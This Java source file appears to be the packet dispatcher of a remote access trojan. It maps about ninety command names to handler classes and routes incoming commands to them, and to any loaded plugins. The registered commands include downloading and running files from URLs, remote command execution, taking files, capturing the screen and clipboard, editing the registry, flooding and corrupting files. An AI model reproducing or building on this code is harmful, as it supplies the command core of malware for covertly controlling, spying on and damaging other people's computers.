package com.redpois0n.packets;

import java.util.HashMap;
import java.util.Set;

import com.redpois0n.Plugin;

public abstract class Packet {
	
	public static final HashMap<String, Class<? extends Packet>> packets = new HashMap<String, Class<? extends Packet>>();
	
	static {
		packets.clear();
		packets.put("MSGBOX", PacketMSGBOX.class);
		packets.put("DISCONNECT", PacketDISCONNECT.class);
		packets.put("GETSCREEN", PacketGETSCREEN.class);
		packets.put("GETSCREENONCE", PacketGETSCREENONCE.class);		
		packets.put("VISITURL", PacketVISITURL.class);
		packets.put("LISTFILES", PacketLISTFILES.class);
		packets.put("DELETEFILE", PacketDELETEFILE.class);
		packets.put("DLRUNURL", PacketDLRUNURL.class);
		packets.put("UPDATE", PacketUPDATE.class);
		packets.put("LISTPROCESS", PacketLISTPROCESS.class);
		packets.put("KILLPROCESS", PacketKILLPROCESS.class);
		packets.put("GETFILE", PacketGETFILE.class);
		packets.put("FLOOD", PacketFLOOD.class);
		packets.put("RUNCMD", PacketRUNCMD.class);
		packets.put("ENDCMD", PacketENDCMD.class);
		packets.put("EXEC", PacketEXEC.class);
		packets.put("EXECP", PacketEXECP.class);
		packets.put("REFRESHINFO", PacketREFRESHINFO.class);	
		packets.put("SHUTDOWN", PacketSHUTDOWN.class);
		packets.put("RESTART", PacketRESTART.class);
		packets.put("LOGOUT", PacketLOGOUT.class);
		packets.put("SLEEPMODE", PacketSLEEPMODE.class);
		packets.put("LOCK", PacketLOCK.class);
		packets.put("GETRAM", PacketGETRAM.class);
		packets.put("CUSTOMDL", PacketCUSTOMDL.class);
		packets.put("SCRIPT", PacketSCRIPT.class);
		packets.put("UNINSTALL", PacketUNINSTALL.class);
		packets.put("RESTARTC", PacketRESTARTC.class);
		packets.put("REXEC", PacketREXEC.class);
		packets.put("VISITURLMUCH", PacketVISITURLMUCH.class);
		packets.put("THUMBNAIL", PacketTHUMBNAIL.class);
		packets.put("DIR", PacketDIR.class);
		packets.put("TAKEFILE", PacketTAKEFILE.class);
		packets.put("MKDIR", PacketMKDIR.class);
		packets.put("URLSOUND", PacketURLSOUND.class);
		packets.put("RECONNECT", PacketRECONNECT.class);
		packets.put("CMOUSE", PacketCMOUSE.class);
		packets.put("RNTO", PacketRNTO.class);
		packets.put("STARTCHAT", PacketSTARTCHAT.class);
		packets.put("ENDCHAT", PacketENDCHAT.class);
		packets.put("MC", PacketMC.class);
		packets.put("CHAT", PacketCHAT.class);
		packets.put("LOG", PacketLOG.class);
		packets.put("FIND", PacketFIND.class);
		packets.put("EFIND", PacketEFIND.class);
		packets.put("GETHOSTFI", PacketGETHOSTFI.class);
		packets.put("UHOST", PacketUHOST.class);
		packets.put("GETUT", PacketGETUT.class);
		packets.put("NUDGE", PacketNUDGE.class);
		packets.put("CBOARD", PacketCBOARD.class);
		packets.put("RD", PacketRD.class);
		packets.put("JVM", PacketJVM.class);
		packets.put("IMGP", PacketIMGP.class);
		packets.put("ZIP", PacketZIP.class);
		packets.put("MD5", PacketMD5.class);
		packets.put("BEEP", PacketBEEP.class);
		packets.put("PIA", PacketPIA.class);
		packets.put("CPIA", PacketCPIA.class);
		packets.put("FZ", PacketFZ.class);
		packets.put("PRINTER", PacketPRINTER.class);
		packets.put("CORRUPT", PacketCORRUPT.class);
		packets.put("LISTLAN", PacketLISTLAN.class);
		packets.put("IPCONFIG", PacketIPCONFIG.class);
		packets.put("GETPORTS", PacketGETPORTS.class);
		packets.put("GC", PacketGC.class);
		packets.put("SESRED", PacketSESRED.class);
		packets.put("SPEECH", PacketSPEECH.class);
		packets.put("LISTSER", PacketLISTSER.class);
		packets.put("LISTSTARTUP", PacketLISTSTARTUP.class);
		packets.put("REG", PacketREG.class);
		packets.put("REGC", PacketREGC.class);
		packets.put("LISTINSTALL", PacketLISTINSTALL.class);
		packets.put("LISTAD", PacketLISTAD.class);
		packets.put("SYSINFO", PacketSYSINFO.class);
		packets.put("SO", PacketSO.class);
		packets.put("LISTI", PacketLISTI.class);
		packets.put("GETERRLOG", PacketGETERRLOG.class);
		packets.put("DELERRLOG", PacketDELERRLOG.class);
		packets.put("GETSCONFIG", PacketGETSCONFIG.class);
		packets.put("LOADPLUGINS", PacketLOADPLUGINS.class);
		packets.put("PROP", PacketPROP.class);
		packets.put("M", PacketM.class);
		packets.put("P", PacketP.class);
		packets.put("R", PacketR.class);
		packets.put("KP", PacketKP.class);
		packets.put("KR", PacketKR.class);
		packets.put("VAR", PacketVAR.class);	
		packets.put("LOCALES", PacketLOCALES.class);
		packets.put("QUICKDESKTOP", PacketQUICKDESKTOP.class);
	}
	
	public static final void execute(String line) {
		try {
			for (Plugin p : Plugin.list) {
				p.methods.get("onpacket").invoke(p.instance, new Object[] { line });
			}
			
			Packet packet = null;
			Set<String> set = packets.keySet();
			for (String str : set) {
				if (line.equals(str)) {
					packet = packets.get(str).newInstance();
					break;
				}
			}
			
			if (packet != null) {
				try {
					packet.read(line);
				} catch (Exception ex) {
					throw ex;
				}
			}
		} catch (Exception ex) {
			Exception ex1 = new Exception("Failed to handle packet " + line, ex);
			ex1.printStackTrace();
		}
	}
	
	public abstract void read(String line) throws Exception;

}
